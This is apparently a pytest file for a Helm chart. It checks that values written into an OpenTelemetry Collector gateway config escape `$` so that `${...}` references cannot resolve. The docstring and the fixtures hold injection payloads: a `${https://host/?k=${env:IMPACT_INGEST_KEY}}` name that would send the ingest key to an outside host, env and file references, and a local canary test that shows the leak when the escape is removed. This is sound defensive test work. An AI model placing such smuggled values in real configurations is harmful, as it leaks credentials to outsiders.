# SPDX-License-Identifier: Apache-2.0

"""A value the chart writes into the gateway's configuration stays the text it was.

The Collector reads `${...}` in every string of its configuration before it parses anything: `${env:NAME}` becomes the
variable, `${file:PATH}` the file and `${https://host/path}` what that URL answers. A cluster name or ARN is free text
from the command that installs the kit, so a name such as `${https://host/?k=${env:IMPACT_INGEST_KEY}}` would have sent
the cluster's ingest key to that host every time the gateway started. The Collector writes a literal `$` as `$$`, and
the chart writes it for every `$` of every value it renders into the configuration, through one helper
(`cluster-kit.collectorLiteral`).

The render tests undo the escape the way the Collector does. The container tests run the pinned Collector image
(`otelcol validate` and `otelcol print-config`, which resolves the configuration) on the rendered ConfigMap, with a
listener on the host standing in for somebody else's server: it is never asked for anything, the statements come back
as the literal values, and with the escape taken out the same run does send the key there.
"""

from __future__ import annotations

import http.server
import json
import os
import shutil
import subprocess
import tempfile
import threading
from pathlib import Path

import pytest
import yaml
from test_chart import CHART, CI_VALUES, STATEMENT, helm

COLLECTOR = yaml.safe_load((CHART / "values.yaml").read_text())["images"]["collector"]
IMAGE = f"{COLLECTOR['repository']}@{COLLECTOR['digest']}"
KEY = "canary-key-3c9f0a71d2"  # the ingest key the gateway holds in the container tests
ENGINE = os.environ.get("CONTAINER") or ("docker" if shutil.which("docker") else "podman")
needs_a_container_engine = pytest.mark.skipif(not shutil.which(ENGINE), reason="needs docker or podman")

NAMES = {
    "a variable": "a${env:IMPACT_INGEST_KEY}b",
    "a file": "${file:/etc/hostname}",
    "a reference in a reference": "${env:${env:IMPACT_INGEST_KEY}}",
    "dollar signs": "price $5, $, $$ and a last $",
    "a bracket": "$(IMPACT_INGEST_KEY) and ${",
}
ARN = "arn:aws:eks:eu-west-1:012345678901:cluster/${env:IMPACT_INGEST_KEY}"


def config_text(tmp_path: Path, *, name: str = "", arn: str = "") -> str:
    """The gateway's config.yaml as the chart renders it for this cluster name and ARN."""
    values = tmp_path / "values.yaml"
    values.write_text(yaml.safe_dump({"cluster": {"name": name, "arn": arn}}))
    rendered = helm(
        *("template", "impact-ai", str(CHART), "-n", "impact-ai", "-f", str(CI_VALUES), "-f", str(values)),
        *("--set", "cloud.provider=aws", "--set-string", "cloud.accountId=012345678901"),
        *("--set", "cloud.region=eu-west-1", "--show-only", "templates/gateway-config.yaml"),
    ).stdout
    return yaml.safe_load(rendered)["data"]["config.yaml"]


def statements(config: str) -> list[str]:
    (block,) = yaml.safe_load(config)["processors"]["transform/cluster"]["trace_statements"]
    return block["statements"]


def as_the_collector_reads(text: str) -> str:
    """A string of the configuration after the Collector's resolver: `$$` is a literal `$`, and any other `$` would be
    the start of a reference."""
    assert "$" not in text.replace("$$", ""), f"a reference is left in {text!r}"
    return text.replace("$$", "$")


def attributes_of(resolved: list[str]) -> dict[str, str]:
    """attribute -> the value the statements set, from statements the resolver has read."""
    found = {}
    for statement in resolved:
        match = STATEMENT.fullmatch(statement)
        assert match, f"not a statement the gateway is meant to hold: {statement!r}"
        found[match.group(1)] = json.loads(match.group(2))
    return found


@pytest.mark.parametrize("name", NAMES.values(), ids=NAMES)
def test_every_dollar_sign_of_a_cluster_name_and_an_arn_is_written_as_two(name, tmp_path):
    config = config_text(tmp_path, name=name, arn=ARN)
    attributes = attributes_of([as_the_collector_reads(s) for s in statements(config)])
    assert attributes["k8s.cluster.name"] == name
    assert attributes["cloud.resource_id"] == ARN
    assert attributes["cloud.account.id"] == "012345678901" and attributes["cloud.region"] == "eu-west-1"


def test_the_references_the_template_writes_itself_are_still_references(tmp_path):
    exporter = yaml.safe_load(config_text(tmp_path, name="x"))["exporters"]["otlp_http"]
    assert exporter["endpoint"] == "${env:IMPACT_INGEST_ENDPOINT}"
    assert exporter["headers"]["authorization"] == "Bearer ${env:IMPACT_INGEST_KEY}"


def test_each_value_the_template_writes_into_a_statement_goes_through_the_one_helper():
    template = (CHART / "templates" / "gateway-config.yaml").read_text()
    printed = [line for line in template.splitlines() if "printf" in line]
    assert printed, "the template writes its statements with printf"
    for line in printed:
        assert 'include "cluster-kit.collectorLiteral"' in line, line
    helpers = (CHART / "templates" / "_helpers.tpl").read_text()
    assert 'define "cluster-kit.collectorLiteral"' in helpers and 'replace "$" "$$"' in helpers


class Canary:
    """A server on the host that answers every GET and keeps what it was asked: somebody else's server."""

    def __enter__(self):
        requests = self.requests = []

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):  # noqa: N802
                requests.append(self.path)
                body = b"canary-says-hello"
                self.send_response(200)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *args):
                pass

        self.server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.port = self.server.server_address[1]
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        return self

    def __exit__(self, *exc):
        self.server.shutdown()
        self.server.server_close()


def collector(config: str, command: str, canary: Canary) -> subprocess.CompletedProcess:
    """`otelcol <command> --config=...` in the pinned image, on the host's network so that 127.0.0.1 is the canary's."""
    directory = tempfile.mkdtemp(
        prefix="gateway-literals-"
    )  # not under pytest's private directory: the image's user reads it
    try:
        Path(directory).chmod(0o755)
        path = Path(directory) / "config.yaml"
        path.write_text(config)
        path.chmod(0o644)
        return subprocess.run(  # noqa: S603 - the container CLI with test-controlled arguments
            [
                ENGINE,
                *("run", "--rm", "--network", "host"),
                *("-e", f"IMPACT_INGEST_ENDPOINT=http://127.0.0.1:{canary.port}", "-e", f"IMPACT_INGEST_KEY={KEY}"),
                *("-v", f"{directory}:/conf:ro", IMAGE, command, "--config=/conf/config.yaml"),
            ],
            capture_output=True,
            text=True,
            timeout=180,
            check=False,
        )
    finally:
        shutil.rmtree(directory, ignore_errors=True)


def resolved_statements(printed: str) -> list[str]:
    (block,) = yaml.safe_load(printed)["processors"]["transform/cluster"]["trace_statements"]
    return block["statements"]


@needs_a_container_engine
@pytest.mark.parametrize("name", NAMES.values(), ids=NAMES)
def test_the_collector_reads_back_the_name_and_the_arn_it_was_given(name, tmp_path):
    config = config_text(tmp_path, name=name, arn=ARN)
    with Canary() as canary:
        result = collector(config, "print-config", canary)
        assert result.returncode == 0, result.stderr
        resolved = resolved_statements(result.stdout)
        assert canary.requests == []
    assert resolved == [as_the_collector_reads(s) for s in statements(config)]
    assert attributes_of(resolved)["k8s.cluster.name"] == name
    assert attributes_of(resolved)["cloud.resource_id"] == ARN
    assert KEY not in "".join(resolved)


@needs_a_container_engine
def test_a_name_that_is_a_url_does_not_send_the_key_there_and_without_the_escape_it_would(tmp_path):
    with Canary() as canary:
        name = "${http://127.0.0.1:" + str(canary.port) + "/x?k=${env:IMPACT_INGEST_KEY}}"
        config = config_text(tmp_path, name=name)
        for command in ("validate", "print-config"):
            result = collector(config, command, canary)
            assert result.returncode == 0, (command, result.stderr)
        assert canary.requests == [], "the Collector asked somebody for something"
        # the control: the configuration as it would be without the escape, which the Collector does resolve
        collector(config.replace("$$", "$"), "print-config", canary)
        assert canary.requests == [f"/x?k={KEY}"], "the test would not have seen the key leave"
